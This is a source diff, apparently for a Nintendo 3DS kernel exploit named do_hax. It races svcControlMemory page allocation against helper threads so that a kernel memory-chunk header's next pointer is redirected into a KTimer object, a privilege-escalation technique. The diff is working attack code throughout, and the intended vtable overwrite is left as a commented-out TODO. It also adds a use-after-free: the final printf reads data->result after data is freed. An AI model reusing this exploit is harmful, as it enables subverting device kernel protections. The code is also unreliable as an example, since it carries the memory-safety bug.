@@ -29,57 +29,49 @@ typedef struct {
     void* prev;
 } MemChunkHdr;
 
+typedef struct {
+    u32 addr;
+    u32 size;
+    Result result;
+} AllocateData;
+
 extern u32 __ctru_heap;
 extern u32 __ctru_heap_size;
 
-static volatile Result control_res = -1;
-
 // Thread function to slow down svcControlMemory execution.
 static void delay_thread(void* arg) {
+    AllocateData* data = (AllocateData*) arg;
+
     // Slow down thread execution until the control operation has completed.
-    while(control_res == -1) {
+    while(data->result == -1) {
         svcSleepThread(10000);
     }
 }
 
 // Thread function to allocate memory pages.
 static void allocate_thread(void* arg) {
-    u32* memInfo = (u32*) arg;
-    if(memInfo == NULL) {
-        // Don't try to use invalid memory information.
-        return;
-    }
+    AllocateData* data = (AllocateData*) arg;
 
     // Allocate the requested pages.
     u32 tmp;
-    control_res = svcControlMemory(&tmp, memInfo[0], 0, memInfo[1], MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
-
-    // Free memory information.
-    free(memInfo);
+    data->result = svcControlMemory(&tmp, data->addr, 0, data->size, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
 }
 
 // Maps pages with chunk headers present.
-static void begin_map_pages(u32 memAddr, u32 memSize) {
-    // Reset control result.
-    control_res = -1;
-
-    // Prepare memory information.
-    u32* memInfo = (u32*) malloc(sizeof(u32) * 2);
-    memInfo[0] = memAddr;
-    memInfo[1] = memSize;
+static AllocateData* begin_map_pages(u32 addr, u32 size) {
+    // Prepare allocate data.
+    AllocateData* data = (AllocateData*) malloc(sizeof(AllocateData));
+    data->addr = addr;
+    data->size = size;
+    data->result = -1;
 
     // Create thread to slow down svcControlMemory execution. Yes, this is ugly, but it works.
-    threadCreate(delay_thread, NULL, 0x4000, 0x18, 1, true);
-    // Create thread to allocate pages.
-    threadCreate(allocate_thread, memInfo, 0x4000, 0x3F, 1, true);
-}
+    threadCreate(delay_thread, data, 0x4000, 0x18, 1, true);
 
-// Waits for the memory mapping thread to complete.
-static void wait_map_complete() {
-    // Wait for the control result to be set.
-    while(control_res == -1) {
-        svcSleepThread(1000000);
-    }
+    // Create thread to allocate pages.
+    threadCreate(allocate_thread, data, 0x4000, 0x3F, 1, true);
+
+    return data;
 }
 
 // Waits for a raw page to be mapped.
@@ -109,6 +101,9 @@ static Result __attribute__((naked)) svcCreateTimerKAddr(Handle* timer, u8 reset
 void do_hax() {
     u32 tmp;
 
+    // Debug output.
+    printf("Setting up...\n");
+
     // Allow threads on core 1.
     aptOpenSession();
     APT_SetAppCpuTimeLimit(30);
@@ -117,9 +112,6 @@ void do_hax() {
     // Prepare memory details.
     u32 memAddr = __ctru_heap + __ctru_heap_size;
     u32 memSize = PAGE_SIZE * 2;
-
-    // Debug output.
-    printf("Memory address: 0x%08X\n", (int) memAddr);
 
     // Isolate a single page between others to ensure using the next chunk.
     svcControlMemory(&tmp, memAddr + memSize, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
@@ -140,10 +132,6 @@ void do_hax() {
     KTimer* timerObj = (KTimer*) (timerAddr - 4);
     MemChunkHdr* fakeHdr = (MemChunkHdr*) &timerObj->refCount;
 
-    // Debug output.
-    printf("Timer object: 0x%08X\n", (int) timerObj);
-    printf("Fake header: 0x%08X\n", (int) fakeHdr);
-
     // Allocate a buffer to back up the allocated kernel page before it is cleared by the allocation code.
     //void* backup = malloc(PAGE_SIZE);
 
@@ -151,7 +139,7 @@ void do_hax() {
     printf("Mapping pages for overwrite...\n");
 
     // Map the pages.
-    begin_map_pages(memAddr, memSize);
+    AllocateData* data = begin_map_pages(memAddr, memSize);
 
     // Overwrite the header "next" pointer to our crafted MemChunkHdr within the timer.
     wait_raw_mapped(memAddr);
@@ -162,16 +150,20 @@ void do_hax() {
     //memcpy(backup, (void*) (memAddr + PAGE_SIZE), PAGE_SIZE);
 
     // Debug output.
-    printf("Post-overwrite control result: 0x%08X\n", (int) control_res);
+    printf("Post-overwrite control result: 0x%08X\n", (int) data->result);
 
     // Wait for memory mapping to complete.
-    wait_map_complete();
+    while(data->result == -1) {
+        svcSleepThread(1000000);
+    }
+
+    free(data);
 
     // Restore the kernel page backup.
     //memcpy((void*) (memAddr + PAGE_SIZE), backup, PAGE_SIZE);
 
     // Debug output.
-    printf("Final control result: 0x%08X\n", (int) control_res);
+    printf("Final control result: 0x%08X\n", (int) data->result);
 
     // Free the isolating page, as we don't need it anymore.
     svcControlMemory(&tmp, memAddr + memSize + PAGE_SIZE, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
@@ -180,6 +172,9 @@ void do_hax() {
     // TODO: This needs to be a kernel virtual address.
     //KTimer* mappedTimerObj = (KTimer*) (memAddr + PAGE_SIZE + ((u32) timerObj & 0xFFF));
     //mappedTimerObj->vtable = vtable;
+
+    // Debug output.
+    printf("Cleaning up...\n");
 
     // Free the timer.
     svcCloseHandle(timer);
